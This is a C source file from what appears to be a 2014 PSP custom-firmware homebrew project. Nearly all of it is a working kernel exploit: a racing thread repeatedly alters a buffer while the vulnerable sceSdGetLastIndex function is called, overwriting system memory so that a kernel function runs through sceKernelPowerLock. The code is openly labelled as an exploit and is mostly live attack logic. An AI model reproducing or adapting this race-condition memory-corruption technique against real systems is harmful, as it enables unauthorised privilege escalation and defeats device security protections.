/*
	Custom Emulator Firmware
	Copyright (C) 2014, Total_Noob

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <common.h>

#include "main.h"
#include "libc.h"
#include "utils.h"

int (* _sceKernelDelayThread)(SceUInt delay);

__attribute__((noinline)) int ValidUserAddressVolatileMem(void *addr)
{
	if((u32)addr >= 0x08400000 && (u32)addr < 0x08800000) return 1;
	return 0;
}

u32 FindImportVolatileMem(const char *libname, u32 nid)
{
	u32 i;
	for(i = 0x08400000; i < 0x08800000; i += 4)
	{
		SceLibraryStubTable *stub = (SceLibraryStubTable *)i;

		if(ValidUserAddressVolatileMem((void *)stub->libname) && ValidUserAddressVolatileMem(stub->nidtable) && ValidUserAddressVolatileMem(stub->stubtable))
		{
			if(_strcmp(stub->libname, libname) == 0)
			{
				u32 *table = stub->nidtable;

				int j;
				for(j = 0; j < stub->stubcount; j++)
				{
					if(table[j] == nid)
					{
						return ((u32)stub->stubtable + (j * 8));
					}
				}
			}
		}
	}

	return 0;
}

int exploited = 0;
u32 packet[0x100];

void RepairSysmem()
{
	_sw(0x0040F809, 0x8800CB64);
	exploited = 1;
}

int exploit_thread()
{
	while(!exploited)
	{
		packet[9] = 0x8800CB66 - 20 - (u32)&packet;
		_sceKernelDelayThread(0);
	}

	return 0;
}

void doExploit()
{
	/* Find imports in RAM */
	void (* _sceKernelDcacheWritebackAll)() = (void *)FindImport("UtilsForUser", 0x79D1C3FA);

	SceUID (* _sceKernelCreateThread)(const char *name, SceKernelThreadEntry entry, int initPriority, int stackSize, SceUInt attr, SceKernelThreadOptParam *option) = (void *)FindImport("ThreadManForUser", 0x446D8DE6);
	int (* _sceKernelStartThread)(SceUID thid, SceSize arglen, void *argp) = (void *)FindImport("ThreadManForUser", 0xF475845D);
	_sceKernelDelayThread = (void *)FindImport("ThreadManForUser", 0xCEADEB47);

	int (* _sceUtilitySavedataGetStatus)(void) = (void *)FindImport("sceUtility", 0x8874DBE0);
	int (* _sceUtilitySavedataInitStart)(SceUtilitySavedataParam *params) = (void *)FindImport("sceUtility", 0x50C4CD57);

	if(!_sceKernelDcacheWritebackAll) ErrorFlashScreen();
	if(!_sceKernelCreateThread || !_sceKernelStartThread || !_sceKernelDelayThread) ErrorFlashScreen();
	if(!_sceUtilitySavedataGetStatus || !_sceUtilitySavedataInitStart) ErrorFlashScreen();

	/* Load required module */
	SceUtilitySavedataParam dialog;

	_memset(&dialog, 0, sizeof(SceUtilitySavedataParam));
	dialog.base.size = sizeof(SceUtilitySavedataParam);
	dialog.base.graphicsThread = 0x11;
	dialog.base.accessThread = 0x13;
	dialog.base.fontThread = 0x12;
	dialog.base.soundThread = 0x10;

	dialog.mode = PSP_UTILITY_SAVEDATA_AUTOLOAD;

	_sceUtilitySavedataInitStart(&dialog);

	while(_sceUtilitySavedataGetStatus() < 2)
	{
		_sceKernelDelayThread(100);
	}

	/* Create thread */
	SceUID thid;
	thid = _sceKernelCreateThread("exploit_thread", exploit_thread, 0x10, 0x1000, 0, NULL);
	if(thid >= 0) _sceKernelStartThread(thid, 0, NULL);

	/* Find the vulnerable function */
	int (* _sceSdGetLastIndex)(int a0, int a1, int a2) = (void *)FindImportVolatileMem("sceChnnlsv", 0xC4C494F8);
	if(!_sceSdGetLastIndex) ErrorFlashScreen();

	void (* _sceKernelPowerLock)() = (void *)FindImportVolatileMem("sceSuspendForUser", 0xEADB1BD7);
	if(!_sceKernelPowerLock) ErrorFlashScreen();

	while(!exploited)
	{
		packet[9] = 0x10;
		_sceSdGetLastIndex(packet, (u32)packet + 0x100, (u32)packet + 0x200);
		_sceKernelDelayThread(0);

		/* Execute kernel function */
		_sceKernelPowerLock((void *)((u32)kernel_function | 0x80000000));
	}
}